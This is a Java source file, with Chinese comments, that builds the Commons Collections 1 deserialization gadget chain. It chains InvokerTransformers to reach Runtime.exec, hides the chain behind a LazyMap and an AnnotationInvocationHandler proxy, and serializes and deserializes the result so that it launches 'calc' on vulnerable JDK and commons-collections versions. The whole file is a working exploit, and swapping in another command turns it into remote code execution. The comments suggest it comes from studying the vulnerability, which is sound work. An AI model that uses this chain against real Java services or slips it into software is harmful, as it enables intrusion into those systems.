import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/*JDK版本 8u71以下
  commons-collections:3.1*/
public class CC1_LazyMap {
    public static void main(String[] args) throws Exception {
        //构造恶意数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
        };

        //获取恶意数组
        Transformer transformerChain = new ChainedTransformer(transformers);
        //将恶意方法作为修饰元素的方法
        Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(new HashMap(),transformerChain);

        //反射获取并实例化动态代理
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler LazyMap_handler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);

        //代理 lazyMap的接口,使用 LazyMap_handler代理
        //proxyMap在调用到 Map接口中的任意方法之后将会执行 LazyMap_handler的 invoke()方法
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),lazyMap.getClass().getInterfaces(),LazyMap_handler);

        //将 proxyMap带入到 sun.reflect.annotation.AnnotationInvocationHandler类中,去调用 entrySet()方法
        Object handler = constructor.newInstance(Retention.class,proxyMap);

        //序列化
//        FileStream.writeSer(handler,"CC1_LazyMap.ser");
        //反序列化
        FileStream.readSer("CC1_LazyMap.ser");

    }
}
